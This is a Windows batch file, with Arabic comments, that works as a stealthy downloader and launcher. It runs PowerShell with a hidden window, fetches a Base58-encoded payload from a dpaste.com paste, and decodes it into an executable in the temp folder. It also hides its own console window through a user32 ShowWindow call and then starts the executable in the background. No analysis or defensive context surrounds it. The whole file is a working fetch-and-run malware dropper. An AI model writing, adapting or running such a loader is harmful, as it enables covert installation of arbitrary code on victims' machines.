@echo off
setlocal
set "url=https://dpaste.com/2LJHBP5PS.txt"
set "key=нярдарснзрсыеонакыдівеная"
set "outputExe=%TEMP%\script_base58.exe"

:: تحميل السلسلة النصية المشفرة Base58 مباشرة وفك تشفيرها
powershell -WindowStyle Hidden -Command ^
    "try { " ^
    "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; " ^
    "$base58String = (Invoke-WebRequest -Uri '%url%').Content; " ^
    "if (-not $base58String) { Write-Host 'Error: Could not retrieve data from URL'; exit } " ^
    "function From-Base58String($base58) { " ^
    "    $alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'; " ^
    "    $intData = [System.Numerics.BigInteger]::Zero; " ^
    "    foreach ($char in $base58.ToCharArray()) { " ^
    "        $charIndex = $alphabet.IndexOf($char); " ^
    "        if ($charIndex -lt 0) { throw 'Invalid Base58 character.' } " ^
    "        $intData = $intData * 58 + $charIndex; " ^
    "    } " ^
    "    $bytes = $intData.ToByteArray(); " ^
    "    [Array]::Reverse($bytes); " ^
    "    return $bytes; " ^
    "} " ^
	"Add-Type @\" " ^
    "using System; " ^
    "using System.Runtime.InteropServices; " ^
    "public class User32 { " ^
    "    [DllImport(\"user32.dll\")] " ^
    "    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); " ^
    "} " ^
    "\"@; " ^

    ":: جلب نافذة البرنامج باستخدام Handle وإخفائها " ^
    "$hwnd = (Get-Process -Id $PID).MainWindowHandle; " ^
    "$SW_HIDE = 0; " ^
    "[User32]::ShowWindow($hwnd, $SW_HIDE); " ^
    "$decodedBytes = From-Base58String $base58String; " ^
    "[System.IO.File]::WriteAllBytes('%outputExe%', $decodedBytes); " ^
    "Write-Host 'Decryption successful and file created at %outputExe%' } " ^
    "catch { Write-Host 'Error: ' + $_.Exception.Message }
 
if exist "%outputExe%" (
    echo Running the executable...
    start "" /b "%outputExe%"
) else (
    echo Failed to create the executable.
)
endlocal
exit